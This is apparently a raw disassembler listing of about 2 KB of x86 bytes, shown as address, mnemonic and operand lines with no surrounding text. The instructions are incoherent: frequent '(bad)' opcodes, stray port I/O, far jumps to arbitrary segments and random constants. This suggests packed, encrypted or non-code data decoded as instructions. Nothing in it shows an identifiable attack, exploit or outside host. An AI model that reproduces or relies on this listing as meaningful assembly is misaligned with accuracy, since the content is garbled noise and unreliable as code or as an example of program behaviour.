  42d7c5:	cmp    ch,BYTE PTR [eax]
  42d7c7:	ror    BYTE PTR [ebx+eax*4],cl
  42d7ca:	out    0x84,al
  42d7cc:	js     0x42d7e8
  42d7ce:	sbb    edx,DWORD PTR [ecx+0x4d]
  42d7d1:	adc    al,0x1c
  42d7d3:	(bad)  
  42d7d4:	into   
  42d7d5:	sbb    ch,al
  42d7d7:	inc    edx
  42d7d8:	pop    ss
  42d7d9:	push   ecx
  42d7da:	or     eax,0xb7998e43
  42d7df:	pop    DWORD PTR [eax+0x43868b02]
  42d7e5:	(bad)  
  42d7e6:	jb     0x42d785
  42d7e8:	and    ah,BYTE PTR [eax+0x1]
  42d7eb:	push   0xbf51b80
  42d7f0:	sbb    eax,0x80beec41
  42d7f5:	cli    
  42d7f6:	dec    ebp
  42d7f7:	xor    DWORD PTR [edi+0x2aa6db81],edx
  42d7fd:	outs   dx,BYTE PTR ds:[esi]
  42d7fe:	xchg   edx,eax
  42d7ff:	jle    0x42d7fb
  42d801:	mov    fs,WORD PTR [edx+0x76c1354c]
  42d807:	mov    DWORD PTR [eax+0x4],esi
  42d80a:	mov    esp,DWORD PTR [ebx]
  42d80c:	dec    eax
  42d80d:	xchg   ecx,eax
  42d80e:	push   0x88b6d4bb
  42d813:	int    0xcc
  42d815:	pop    esp
  42d816:	bound  edx,QWORD PTR [ecx]
  42d818:	je     0x42d855
  42d81a:	mov    dh,BYTE PTR [esi-0x2be5a4e5]
  42d820:	sar    ah,0x82
  42d823:	jp     0x42d857
  42d825:	xchg   edi,eax
  42d826:	push   ss
  42d827:	xchg   esi,eax
  42d828:	mov    edx,0xfa2632dd
  42d82d:	fdivr  QWORD PTR [ebx+0x47]
  42d830:	push   edi
  42d831:	adc    DWORD PTR [ebx],ecx
  42d833:	sbb    ebx,DWORD PTR ds:0x483c6145
  42d839:	retf   0x779
  42d83c:	mov    bh,0xb6
  42d83e:	add    DWORD PTR [eax-0x576e8aec],eax
  42d844:	sti    
  42d845:	lods   eax,DWORD PTR ds:[esi]
  42d846:	pusha  
  42d847:	mov    esp,0x147445b4
  42d84c:	repnz sti 
  42d84e:	int    0x69
  42d850:	aaa    
  42d851:	xchg   esi,eax
  42d852:	sahf   
  42d853:	das    
  42d854:	rcl    DWORD PTR [edi],1
  42d856:	add    BYTE PTR [edi+edx*8+0x6c2a5fb2],bl
  42d85d:	sub    eax,0x6eaae811
  42d862:	dec    edi
  42d863:	outs   dx,BYTE PTR ds:[esi]
  42d864:	cmp    dh,cl
  42d866:	mov    bl,0xc5
  42d868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d869:	jnp    0x42d81f
  42d86b:	inc    eax
  42d86c:	xor    al,0xaa
  42d86e:	sbb    eax,0xcdc50a31
  42d873:	aad    0x5
  42d875:	out    0x5e,al
  42d877:	mul    DWORD PTR [edx-0x54]
  42d87a:	or     al,0xa0
  42d87c:	mov    eax,0x41cd346d
  42d881:	sub    cl,dh
  42d883:	inc    edi
  42d884:	inc    esi
  42d885:	cli    
  42d886:	popa   
  42d887:	popa   
  42d888:	imul   ebx,DWORD PTR [ebx+0x2358011f],0x77
  42d88f:	loope  0x42d901
  42d891:	mov    edx,0x6b5b8022
  42d896:	bound  ecx,QWORD PTR [edi]
  42d898:	popa   
  42d899:	pop    esi
  42d89a:	das    
  42d89b:	cmp    eax,DWORD PTR [edx-0x175c9e2b]
  42d8a1:	add    ah,BYTE PTR [eax-0x266b5e94]
  42d8a7:	ins    DWORD PTR es:[edi],dx
  42d8a8:	mov    ds:0xc4a06a83,eax
  42d8ad:	rol    BYTE PTR [edx-0x5a],0x3e
  42d8b1:	imul   esi,DWORD PTR [edi],0xffffffb6
  42d8b4:	mov    dh,0x35
  42d8b6:	or     edi,DWORD PTR [ecx+0x22]
  42d8b9:	repz stc 
  42d8bb:	pop    edi
  42d8bc:	sub    eax,0xd16eef
  42d8c1:	lds    esi,FWORD PTR [esi-0x23]
  42d8c4:	and    edi,DWORD PTR ss:[ebp+0x7e]
  42d8c8:	in     eax,0x26
  42d8ca:	sbb    bl,0xb6
  42d8cd:	cmp    DWORD PTR ds:0xa3b35e1d,eax
  42d8d3:	test   eax,0xb75bf9f9
  42d8d8:	test   DWORD PTR [ebx],eax
  42d8da:	pop    ds
  42d8db:	test   esp,edx
  42d8dd:	test   ecx,edx
  42d8df:	mov    BYTE PTR [edx+0x531500],ah
  42d8e5:	sti    
  42d8e6:	mov    ah,0x95
  42d8e8:	fbld   TBYTE PTR [eax+0x1d]
  42d8eb:	xchg   edx,eax
  42d8ec:	shl    DWORD PTR [eax+0x0],cl
  42d8ef:	popa   
  42d8f0:	pop    esi
  42d8f1:	loopne 0x42d8e9
  42d8f3:	adc    al,0xc0
  42d8f5:	lods   eax,DWORD PTR ds:[esi]
  42d8f6:	add    eax,0x2983fb17
  42d8fb:	in     eax,dx
  42d8fc:	or     bl,BYTE PTR [edx-0x28]
  42d8ff:	sub    cl,BYTE PTR [edi]
  42d901:	jb     0x42d8eb
  42d903:	jb     0x42d8c0
  42d905:	pusha  
  42d906:	icebp  
  42d907:	mov    bl,0xd0
  42d909:	lods   eax,DWORD PTR ds:[esi]
  42d90a:	lods   eax,DWORD PTR ds:[esi]
  42d90b:	push   0xcfa99832
  42d910:	icebp  
  42d911:	xor    bl,BYTE PTR [esi+0x7]
  42d914:	sub    al,0x35
  42d916:	loopne 0x42d8b6
  42d918:	cmc    
  42d919:	and    ah,BYTE PTR [ebx+ebx*1+0x3605f2cc]
  42d920:	and    BYTE PTR [edi-0x1be169d1],dl
  42d926:	add    BYTE PTR [edx-0x1fd65c90],bl
  42d92c:	pop    es
  42d92d:	clc    
  42d92e:	pop    eax
  42d92f:	pop    es
  42d930:	jb     0x42d958
  42d932:	mov    eax,ds:0x175ba0b
  42d937:	rol    BYTE PTR [eax+0x68904d2c],0x2
  42d93e:	outs   dx,BYTE PTR ds:[esi]
  42d93f:	pop    ebp
  42d940:	mov    ah,0xa4
  42d942:	jnp    0x42d9a0
  42d944:	and    edx,ebx
  42d946:	and    bh,bl
  42d948:	adc    eax,0x27ba8dc1
  42d94d:	out    dx,eax
  42d94e:	addr16 mov eax,0x2a9b1ac7
  42d954:	jbe    0x42d9cd
  42d956:	mov    ebx,0xebc75bd7
  42d95b:	add    edx,esi
  42d95d:	add    ebp,ebx
  42d95f:	push   ss
  42d960:	inc    eax
  42d961:	adc    edi,DWORD PTR [ecx+0x5d972e8e]
  42d967:	sbb    ah,BYTE PTR [ebx-0x55]
  42d96a:	or     edx,ebp
  42d96c:	mov    BYTE PTR ds:0x5c88ab32,dl
  42d972:	or     DWORD PTR [esi],esi
  42d974:	inc    eax
  42d975:	mov    bh,0x6d
  42d977:	mov    eax,ds:0xfa0b2168
  42d97c:	push   edx
  42d97d:	add    eax,0x151395ae
  42d982:	fwait
  42d983:	and    BYTE PTR [ecx+0x5b],bh
  42d986:	xor    eax,0x6dbcb56
  42d98b:	inc    eax
  42d98c:	mov    eax,0xe4591e99
  42d991:	add    cl,dh
  42d993:	mov    ebp,0xb5b6eaa
  42d998:	and    eax,0xf2820d54
  42d99d:	or     eax,0xd8dda08d
  42d9a2:	mov    edx,0x447da7b8
  42d9a7:	test   al,0xc1
  42d9a9:	or     bl,BYTE PTR [esp+esi*1+0x55]
  42d9ad:	jne    0x42da0a
  42d9af:	adc    eax,0x49730ea5
  42d9b4:	mov    bh,0xc2
  42d9b6:	sbb    eax,0xeb04b011
  42d9bb:	repz (bad) 
  42d9bd:	fist   DWORD PTR [ecx+0x2d]
  42d9c0:	adc    BYTE PTR [ebp+0x4dccef26],dh
  42d9c6:	fdivr  QWORD PTR [edx]
  42d9c8:	mov    dl,bl
  42d9ca:	pop    esi
  42d9cb:	jnp    0x42d980
  42d9cd:	repz cmp bh,BYTE PTR [ebp+0x27]
  42d9d1:	outs   dx,BYTE PTR ds:[esi]
  42d9d2:	stos   BYTE PTR es:[edi],al
  42d9d3:	ins    DWORD PTR es:[edi],dx
  42d9d4:	push   ebx
  42d9d5:	adc    DWORD PTR [edx-0x20],eax
  42d9d8:	mov    ecx,0x9696ef20
  42d9dd:	lods   eax,DWORD PTR ds:[esi]
  42d9de:	scas   al,BYTE PTR es:[edi]
  42d9df:	pop    es
  42d9e0:	into   
  42d9e1:	jo     0x42da3a
  42d9e3:	cmp    BYTE PTR [ebp+0x19],ah
  42d9e6:	pop    ss
  42d9e7:	shr    BYTE PTR [ebp+0x760165dd],1
  42d9ed:	pop    ecx
  42d9ee:	ds out 0x9b,eax
  42d9f1:	outs   dx,BYTE PTR ds:[esi]
  42d9f2:	xchg   al,ah
  42d9f4:	(bad)  
  42d9f5:	push   edx
  42d9f6:	xor    al,0xb
  42d9f8:	inc    ecx
  42d9f9:	mov    ch,0xf0
  42d9fb:	pop    esi
  42d9fc:	out    0x60,al
  42d9fe:	stos   DWORD PTR es:[edi],eax
  42d9ff:	ins    DWORD PTR es:[edi],dx
  42da00:	fstp   TBYTE PTR [ebx]
  42da02:	cwde   
  42da03:	mov    DWORD PTR [edi+0x2271d814],ecx
  42da09:	fbld   TBYTE PTR [ecx+0x292362a3]
  42da0f:	xor    eax,0x19fa0bb3
  42da14:	test   al,0x4d
  42da16:	jno    0x42d9b2
  42da18:	mov    ebx,0x3c2e5367
  42da1d:	mov    BYTE PTR [eax-0x45],ah
  42da20:	push   ebp
  42da21:	je     0x42da7b
  42da23:	and    eax,0xa3686f7a
  42da28:	sub    ch,BYTE PTR [ebp+edx*2+0x4]
  42da2c:	lods   eax,DWORD PTR ds:[esi]
  42da2d:	and    eax,0xb75405c7
  42da32:	lea    ecx,[esi+0x6eae9627]
  42da38:	cwde   
  42da39:	mov    ch,0x63
  42da3b:	ins    DWORD PTR es:[edi],dx
  42da3c:	mov    ah,BYTE PTR [eax+0x17]
  42da3f:	retf   
  42da40:	scas   al,BYTE PTR es:[edi]
  42da41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da42:	(bad)  
  42da43:	cmp    DWORD PTR [eax+eax*8-0x72],ebp
  42da47:	mov    ds:0x6e21857e,al
  42da4c:	push   cs
  42da4d:	in     al,dx
  42da4e:	aam    0xe8
  42da50:	sbb    dl,0x11
  42da53:	(bad)  
  42da54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da55:	inc    esi
  42da56:	jne    0x42daac
  42da58:	stos   BYTE PTR es:[edi],al
  42da59:	ss inc ebp
  42da5b:	fsubr  QWORD PTR [ebx+0x136c1a8]
  42da61:	adc    BYTE PTR [esi-0x19149c65],dh
  42da67:	imul   edx,ecx,0x2874c0fa
  42da6d:	cmc    
  42da6e:	push   0x8e8ad8d4
  42da73:	mov    al,ds:0xd3c62d10
  42da78:	jbe    0x42da55
  42da7a:	call   0x5a445b7f
  42da7f:	xor    al,BYTE PTR [eax+0x65477c88]
  42da85:	jecxz  0x42dadd
  42da87:	test   al,0x4c
  42da89:	loopne 0x42da68
  42da8b:	bound  eax,QWORD PTR [ebp+0x76]
  42da8e:	mov    es,WORD PTR [edx+0x60144b6e]
  42da94:	inc    esp
  42da95:	pop    edx
  42da96:	aaa    
  42da97:	jg     0x42da22
  42da99:	pusha  
  42da9a:	pop    ss
  42da9b:	les    edi,FWORD PTR [ecx-0x49d199b8]
  42daa1:	xchg   ebx,eax
  42daa2:	ins    BYTE PTR es:[edi],dx
  42daa3:	lea    ecx,[ebx]
  42daa5:	test   ebp,ebp
  42daa7:	fiadd  WORD PTR [edx]
  42daa9:	pop    ebp
  42daaa:	outs   dx,BYTE PTR ds:[esi]
  42daab:	daa    
  42daac:	xor    al,dl
  42daae:	cs sub al,0xbe
  42dab1:	addr16 pop ebx
  42dab3:	sahf   
  42dab4:	retf   
  42dab5:	xor    eax,0x580ab4
  42daba:	push   ss
  42dabb:	xor    eax,DWORD PTR [edi-0x79]
  42dabe:	inc    esp
  42dabf:	mov    ds:0xc6ed041d,al
  42dac4:	mov    cl,0xfd
  42dac6:	pop    esp
  42dac7:	adc    BYTE PTR [ebx+0x26a836d0],ch
  42dacd:	dec    ecx
  42dace:	pop    ebp
  42dacf:	stos   BYTE PTR es:[edi],al
  42dad0:	jmp    0x46b9:0x6aa9e33e
  42dad7:	cli    
  42dad8:	jmp    0x9a96:0xf3865cbf
  42dadf:	call   0x7194df3a
  42dae4:	lea    ecx,[edx]
  42dae6:	jge    0x42dada
  42dae8:	ins    DWORD PTR es:[edi],dx
  42dae9:	xchg   BYTE PTR [esi],dh
  42daeb:	ss ss out 0x69,al
  42daef:	jle    0x42dabc
  42daf1:	adc    al,0x84
  42daf3:	sbb    ch,BYTE PTR [eax]
  42daf5:	cs mov al,0xec
  42daf8:	loopne 0x42db30
  42dafa:	adc    dh,BYTE PTR [edx-0x48]
  42dafd:	jge    0x42db19
  42daff:	sub    dh,BYTE PTR [esi]
  42db01:	and    dh,cl
  42db03:	xchg   DWORD PTR cs:[edi],edx
  42db06:	mov    edx,ebx
  42db08:	inc    ecx
  42db09:	fisttp QWORD PTR [edi-0xbf1ae3a]
  42db0f:	jge    0x42db72
  42db11:	inc    ecx
  42db12:	jne    0x42dabd
  42db14:	mov    al,0xee
  42db16:	cmp    esp,DWORD PTR [edi-0x20]
  42db19:	test   DWORD PTR [esi+0x76d43205],0x9eb90f68
  42db23:	pop    edi
  42db24:	in     al,dx
  42db25:	stos   BYTE PTR es:[edi],al
  42db26:	mov    dh,0x23
  42db28:	outs   dx,BYTE PTR ds:[esi]
  42db29:	pop    ecx
  42db2a:	mov    dl,0x7
  42db2c:	mov    ecx,0xb492f432
  42db31:	fild   DWORD PTR [esi-0x5d]
  42db34:	add    DWORD PTR [eax+esi*1-0x62],edx
  42db38:	aaa    
  42db39:	loope  0x42db5b
  42db3b:	mov    dh,0xb6
  42db3d:	inc    ebp
  42db3e:	sub    eax,0xa6c3fe8e
  42db43:	repnz push 0x3e160892
  42db49:	fisttp QWORD PTR [edx-0x64]
  42db4c:	out    dx,al
  42db4d:	mov    WORD PTR [edx-0x12d1e08b],ss
  42db53:	(bad)  
  42db54:	inc    ebp
  42db55:	mov    ebx,0x86949968
  42db5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42db5b:	out    0x57,al
  42db5d:	idiv   DWORD PTR [ebp-0x23]
  42db60:	push   0xffffffed
  42db62:	mov    ds:0x8197ecd8,al
  42db67:	dec    edi
  42db68:	xor    DWORD PTR [eax+edi*2-0x4fff2fea],edx
  42db6f:	retf   
  42db70:	mov    al,0x85
  42db72:	mov    dl,0xed
  42db74:	add    BYTE PTR [edi+esi*1-0x26],ch
  42db78:	rcr    ch,cl
  42db7a:	push   ds
  42db7b:	test   eax,0xb456efa7
  42db80:	or     DWORD PTR [eax+0x37ee471d],esp
  42db86:	aas    
  42db87:	and    DWORD PTR [ecx],0x113405b1
  42db8d:	jbe    0x42db91
  42db8f:	push   es
  42db90:	push   edx
  42db91:	inc    edx
  42db92:	rcl    dh,0x55
  42db95:	ret    
  42db96:	or     BYTE PTR [edx-0x23],cl
  42db99:	sub    eax,0xd551db46
  42db9e:	cs sbb al,0x89
  42dba1:	pop    ebp
  42dba2:	clc    
  42dba3:	and    al,0x86
  42dba5:	mov    ch,BYTE PTR [esi-0x13]
  42dba8:	fisttp WORD PTR [ebx]
  42dbaa:	pop    edi
  42dbab:	dec    edx
  42dbac:	aas    
  42dbad:	lods   eax,DWORD PTR ds:[esi]
  42dbae:	xor    DWORD PTR [eax],ebp
  42dbb0:	ss add eax,0x2bc8f4b7
  42dbb6:	jo     0x42db3c
  42dbb8:	test   DWORD PTR [ebx-0x64eaac98],edx
  42dbbe:	loopne 0x42dbe8
  42dbc0:	fldcw  WORD PTR [edx-0x3f]
  42dbc3:	push   eax
  42dbc4:	pop    ebx
  42dbc5:	add    DWORD PTR [edx-0x4ef0b0df],esp
  42dbcb:	push   0x65012d08
  42dbd0:	or     DWORD PTR [esi+0x3d04e972],0xa0e6ea3b
  42dbda:	adc    esp,edx
  42dbdc:	inc    edi
  42dbdd:	pop    ds
  42dbde:	gs pop ebp
  42dbe0:	int    0x81
  42dbe2:	outs   dx,BYTE PTR ds:[esi]
  42dbe3:	sbb    ebx,DWORD PTR ds:0xf6408001
  42dbe9:	dec    edx
  42dbea:	add    DWORD PTR [esi+0x6da16285],0xffffff82
  42dbf1:	dec    esi
  42dbf2:	aam    0x73
  42dbf4:	add    eax,0x7b6df21f
  42dbf9:	push   0x9
  42dbfb:	popf   
  42dbfc:	push   ds
  42dbfd:	mov    ah,0x76
  42dbff:	ds xchg ecx,eax
  42dc01:	retf   
  42dc02:	adc    al,0x5d
  42dc04:	push   eax
  42dc05:	fld    TBYTE PTR [ebx+0x48]
  42dc08:	adc    al,0x11
  42dc0a:	mov    esi,0xc0435be6
  42dc0f:	lods   eax,DWORD PTR ds:[esi]
  42dc10:	cli    
  42dc11:	pop    esp
  42dc12:	mov    ecx,0x56a1561
  42dc17:	dec    edi
  42dc18:	mov    BYTE PTR [eax-0xa319393],bh
  42dc1e:	jb     0x42dc1a
  42dc20:	or     ebx,edi
  42dc22:	pop    edx
  42dc23:	imul   edx,DWORD PTR [edi+0x44],0xffffffbb
  42dc27:	out    dx,eax
  42dc28:	mov    al,0x53
  42dc2a:	push   esp
  42dc2b:	mov    dh,0x30
  42dc2d:	xchg   ecx,eax
  42dc2e:	or     ebx,DWORD PTR [ebx+0x64786088]
  42dc34:	and    eax,0x60858e57
  42dc39:	mov    esi,DWORD PTR [edx+0x0]
  42dc3c:	sbb    cl,BYTE PTR [esi+eax*1]
  42dc3f:	jmp    0x42dbe3
  42dc41:	mov    dh,0xd
  42dc43:	push   cs
  42dc44:	imul   DWORD PTR [edi]
  42dc46:	jae    0x42dc5a
  42dc48:	mov    ch,0x89
  42dc4a:	iret   
  42dc4b:	lods   eax,DWORD PTR ds:[esi]
  42dc4c:	lods   eax,DWORD PTR ds:[esi]
  42dc4d:	jno    0x42dc47
  42dc4f:	mov    ah,0xed
  42dc51:	ds dec esi
  42dc53:	mov    ss,WORD PTR [esi+0x6db4868b]
  42dc59:	ins    DWORD PTR es:[edi],dx
  42dc5a:	(bad)  
  42dc5b:	loopne 0x42dc05
  42dc5d:	xor    dl,BYTE PTR ds:0x549e9c22
  42dc63:	loop   0x42dc3b
  42dc65:	mov    dh,0xb5
  42dc67:	inc    ecx
  42dc68:	xor    al,BYTE PTR [ebx+ebx*4]
  42dc6b:	pop    ecx
  42dc6c:	daa    
  42dc6d:	jo     0x42dce9
  42dc6f:	neg    DWORD PTR [ebp+0x41]
  42dc72:	in     al,dx
  42dc73:	or     cl,BYTE PTR [edi]
  42dc75:	or     ch,dl
  42dc77:	push   ds
  42dc78:	dec    ebx
  42dc79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc7a:	lods   eax,DWORD PTR ds:[esi]
  42dc7b:	push   es
  42dc7c:	stos   BYTE PTR es:[edi],al
  42dc7d:	dec    edx
  42dc7e:	pop    esp
  42dc7f:	mov    bl,0xd0
  42dc81:	or     edi,DWORD PTR [ecx-0x48ab8b92]
  42dc87:	stos   BYTE PTR es:[edi],al
  42dc88:	push   esi
  42dc89:	mov    bh,0x4
  42dc8b:	call   0x2b76:0x457bcc8b
  42dc92:	push   ebp
  42dc93:	adc    eax,0x4e23ec1f
  42dc98:	mov    DWORD PTR [edx+edx*8-0x782be8ba],ecx
  42dc9f:	inc    eax
  42dca0:	outs   dx,DWORD PTR ds:[esi]
  42dca1:	inc    ebx
  42dca3:	mov    eax,ds:0xed8000ec
  42dca8:	sbb    eax,0x3c330263
  42dcad:	addr16 push ebx
  42dcaf:	mov    edx,0xb475b80
  42dcb4:	jbe    0x42dcf1
  42dcb6:	cmp    al,0x32
  42dcb8:	daa    
  42dcb9:	sub    BYTE PTR [esi+0x34],0x50
  42dcbd:	mov    bh,0xfa
  42dcbf:	mov    ah,0x44
  42dcc1:	js     0x42dd1a
  42dcc3:	xor    BYTE PTR [esi+0x40],bh
  42dcc6:	push   ebp
  42dcc7:	aad    0x2e
  42dcc9:	cmp    BYTE PTR [esi-0x36],0x6c
  42dccd:	sbb    BYTE PTR [ebx],0xed
  42dcd0:	(bad)  
  42dcd1:	jge    0x42dcc8
  42dcd3:	mov    ecx,0x1e894257
  42dcd8:	fmul   QWORD PTR [edx+ebx*8-0x4a]
  42dcdc:	jno    0x42dcc9
  42dcde:	mov    ebx,0xffd72913
  42dce3:	add    edi,DWORD PTR [ebp-0x4997f0e9]
  42dce9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dcea:	test   al,0xad
  42dcec:	sbb    eax,0xb36b4929
  42dcf1:	les    ebp,FWORD PTR [esi]
  42dcf3:	adc    BYTE PTR [eax+0x1be30200],bl
  42dcf9:	pop    edi
  42dcfa:	or     eax,0xb7347415
  42dcff:	xchg   esi,eax
  42dd00:	push   esp
  42dd01:	outs   dx,BYTE PTR ds:[esi]
  42dd02:	cmp    BYTE PTR [esi+ebp*2],dh
  42dd05:	sub    eax,0xe67a3e6d
  42dd0a:	scas   eax,DWORD PTR es:[edi]
  42dd0b:	call   0xa2fa054a
  42dd10:	in     eax,dx
  42dd11:	mov    dh,0x2d
  42dd13:	mov    ds:0x80eb3e65,eax
  42dd18:	and    al,0x5a
  42dd1a:	inc    ecx
  42dd1b:	sbb    BYTE PTR [esi*1-0x1c9d565e],ch
  42dd22:	sub    DWORD PTR [edi+ebx*8],0xffffffdb
  42dd26:	adc    bl,BYTE PTR [ebx]
  42dd28:	or     ebp,DWORD PTR [eax+edx*8-0x6d]
  42dd2c:	push   0x43179fbb
  42dd31:	xchg   esi,eax
  42dd32:	ss inc ebx
  42dd34:	dec    ebx
  42dd35:	inc    edi
  42dd36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd37:	cwde   
  42dd38:	imul   edx,DWORD PTR [eax],0x29
  42dd3b:	or     DWORD PTR [esi],ecx
  42dd3d:	mov    ds:0x68290e85,al
  42dd42:	les    eax,FWORD PTR [edi+esi*2+0x4546d2c2]
  42dd49:	push   ds
  42dd4a:	dec    esp
  42dd4b:	sbb    dl,BYTE PTR [edx+0x86aa99d]
  42dd51:	call   0xabdd66c3
  42dd56:	mov    edx,0x42e35b0b
  42dd5b:	popf   
  42dd5c:	xchg   esi,eax
  42dd5d:	cld    
  42dd5e:	or     ebx,esp
  42dd60:	xchg   ebp,eax
  42dd61:	fsubr  QWORD PTR [eax-0x49fd7173]
  42dd67:	loop   0x42dde3
  42dd69:	(bad)  
  42dd6a:	in     al,dx
  42dd6b:	repz jb 0x42dd24
  42dd6e:	fstp   st(2)
  42dd70:	lea    ecx,[ecx+eiz*8]
  42dd73:	jns    0x42dd47
  42dd75:	es mov esp,0x486bdafc
  42dd7b:	mov    WORD PTR [ebx-0x4d2eae2f],?
  42dd81:	js     0x42dd3e
  42dd83:	or     DWORD PTR [ecx-0x6929520e],esp
  42dd89:	outs   dx,BYTE PTR ds:[esi]
  42dd8a:	ins    DWORD PTR es:[edi],dx
  42dd8b:	lahf   
  42dd8c:	into   
  42dd8d:	pop    ecx
  42dd8e:	mov    ch,0x9e
  42dd90:	in     al,dx
  42dd91:	adc    esp,DWORD PTR [ecx-0x7744ff0b]
  42dd97:	fild   DWORD PTR [esi]
  42dd99:	dec    ebp
  42dd9a:	arpl   WORD PTR [eax],sp
  42dd9c:	shl    BYTE PTR [eax+0x742db837],1
  42dda2:	adc    eax,0xa379539c
  42dda7:	jp     0x42dd89
  42dda9:	adc    eax,0x26b6dc4
  42ddae:	cwde   
  42ddaf:	pop    edx
  42ddb0:	fnstsw WORD PTR [edi-0x127bb726]
  42ddb6:	and    bl,dl
  42ddb8:	add    DWORD PTR [edi+0x5863aeba],esi
  42ddbe:	scas   al,BYTE PTR es:[edi]
  42ddbf:	mov    ds:0xdf445da7,al
  42ddc4:	xor    DWORD PTR [ebx],0x17
  42ddc7:	push   ss
  42ddc8:	lods   eax,DWORD PTR ds:[esi]
  42ddc9:	adc    al,0xb0
  42ddcb:	xor    eax,0xc15e5060
  42ddd0:	jmp    0xa5e8b942
  42ddd5:	inc    esp
  42ddd6:	inc    ebp
  42ddd7:	std    
  42ddd8:	into   
  42ddd9:	adc    al,0xaf
  42dddb:	mov    eax,ds:0x8a0268d1
  42dde0:	pop    ebp
  42dde1:	lds    esi,FWORD PTR [esi+0x7b3b1e1d]
  42dde7:	push   edi
  42dde8:	jns    0x42ddd5
  42ddea:	pop    ebx
  42ddeb:	pop    ebp
  42ddec:	rol    BYTE PTR [esi-0x7308dd19],1
  42ddf2:	leave  
  42ddf3:	push   ss
  42ddf4:	sub    ch,BYTE PTR [edx+eiz*4-0x80]
  42ddf8:	dec    ebx
  42ddf9:	bound  esp,QWORD PTR [edi]
  42ddfb:	dec    esp
  42ddfc:	sbb    dl,cl
  42ddfe:	imul   esi,DWORD PTR [esi-0x67bbf300],0xffffff89
  42de05:	ins    DWORD PTR es:[edi],dx
  42de06:	adc    BYTE PTR [edx-0x2aecbaaa],ch
  42de0c:	pop    ds
  42de0d:	sub    dh,BYTE PTR [ebx-0x61]
  42de10:	cmp    ch,BYTE PTR [edx+0x43]
  42de13:	sar    BYTE PTR [esi+eax*8-0x50],0x5f
  42de18:	sub    eax,0x11362a9
  42de1d:	fcom   QWORD PTR [esi+0x34]
  42de20:	xchg   ebp,eax
  42de21:	mov    ebp,0xdcb65d31
  42de26:	mov    dh,0x8e
  42de28:	adc    al,0xc0
  42de2a:	or     BYTE PTR [esi-0x20],ch
  42de2d:	out    0xf4,al
  42de2f:	(bad)  
  42de30:	and    ebp,eax
  42de32:	or     BYTE PTR [ebp-0x3c],0xef
  42de36:	(bad)  
  42de37:	rcr    BYTE PTR [eax+0x6d827d97],cl
  42de3d:	test   eax,0x2ebe24d8
  42de42:	nop
  42de43:	dec    edx
  42de44:	sbb    esi,edx
  42de46:	inc    ecx
  42de47:	shl    BYTE PTR [esi+0x6e72ba2f],1
  42de4d:	xchg   edi,eax
  42de4e:	jp     0x42de21
  42de50:	es stos BYTE PTR es:[edi],al
  42de52:	fcmovnu st,st(6)
  42de54:	jno    0x42dec3
  42de56:	outs   dx,BYTE PTR ds:[esi]
  42de57:	test   dl,0x33
  42de5a:	inc    ebp
  42de5b:	cmp    eax,DWORD PTR [eax-0x1ef017f3]
  42de61:	imul   esi,DWORD PTR [edx-0x17],0x53
  42de65:	mov    ch,0x3
  42de67:	fisub  DWORD PTR [edx-0x4d]
  42de6a:	ins    BYTE PTR es:[edi],dx
  42de6b:	push   0xffffffad
  42de6d:	push   eax
  42de6e:	(bad)  
  42de6f:	test   eax,0x5f62a8ed
  42de74:	loop   0x42de0e
  42de76:	aad    0xb6
  42de78:	retf   
  42de79:	cmc    
  42de7a:	or     eax,0xc7616dd5
  42de7f:	cs jnp 0x42de8d
  42de82:	popf   
  42de83:	mov    ecx,0xb0b5552c
  42de88:	sub    DWORD PTR [eax-0x1c644739],0xe2282f10
  42de92:	inc    esi
  42de93:	inc    edi
  42de94:	cmp    ch,BYTE PTR [esi+0x5baa47ae]
  42de9a:	sbb    BYTE PTR [edx+0x68],0x8e
  42de9e:	push   ebp
  42de9f:	adc    BYTE PTR [ebx],ah
  42dea1:	mov    ds:0x70b262d3,eax
  42dea6:	sub    eax,DWORD PTR [eax-0x1e]
  42dea9:	mov    WORD PTR [esi-0x4e],?
  42deac:	mov    ebx,0xb6176a9f
  42deb1:	test   esi,ebp
  42deb3:	retf   0xf22f
  42deb6:	test   DWORD PTR ds:0x36aa17ba,edi
  42debc:	push   esp
  42debd:	pop    ebp
  42debe:	mov    eax,ds:0x8e3a161b
  42dec3:	les    ebx,FWORD PTR [ebx+0x17]
  42dec6:	les    eax,FWORD PTR [esi]
  42dec8:	push   ecx
  42dec9:	jbe    0x42df35
  42decb:	ror    al,0xf2
  42dece:	pop    eax
  42decf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ded0:	sub    BYTE PTR cs:[esi+0x7d],0xc4
  42ded5:	adc    al,0x17
  42ded7:	dec    esi
  42ded8:	add    eax,0x96d95ada
  42dedd:	push   ebp
  42dede:	(bad)  
  42dedf:	and    BYTE PTR [edx],dh
  42dee1:	push   edx
  42dee2:	ja     0x42de88
  42dee4:	loopne 0x42df48
  42dee6:	jmp    0x42de90
  42dee8:	xchg   ebx,eax
  42dee9:	jo     0x42de6b
  42deeb:	lock mov ebp,0xb6d0cdd4
  42def1:	aaa    
  42def2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42def3:	pop    ecx
  42def4:	clc    
  42def5:	mov    bl,0x59
  42def7:	sbb    al,0x5e
  42def9:	cmp    eax,DWORD PTR [edx]
  42defb:	pusha  
  42defc:	adc    eax,DWORD PTR [edi+0x2c]
  42deff:	aaa    
  42df00:	sub    al,0x36
  42df02:	dec    ebx
  42df03:	(bad)  
  42df04:	push   esi
  42df05:	adc    eax,DWORD PTR [eax]
  42df07:	jo     0x42df7f
  42df09:	jns    0x42deb3
  42df0b:	sub    dl,ch
  42df0d:	es loopne 0x42dee2
  42df10:	mov    ecx,0xbe2bb81a
  42df15:	jge    0x42df83
  42df17:	pop    ebp
  42df18:	jmp    0x22a2:0x55ac76a8
  42df1f:	fild   WORD PTR [ebx+0x6db0d38a]
  42df25:	or     eax,0x951d7915
  42df2a:	fmul   QWORD PTR [edi+0xa88a552]
  42df30:	mov    cl,0xd9
  42df32:	mov    ds:0x6db7ebc0,eax
  42df37:	imul   eax,DWORD PTR [eax-0x3],0x74
  42df3b:	sub    esp,DWORD PTR [ebx]
  42df3d:	sub    DWORD PTR [edi],edx
  42df3f:	mov    BYTE PTR ds:0x51035b05,0x9a
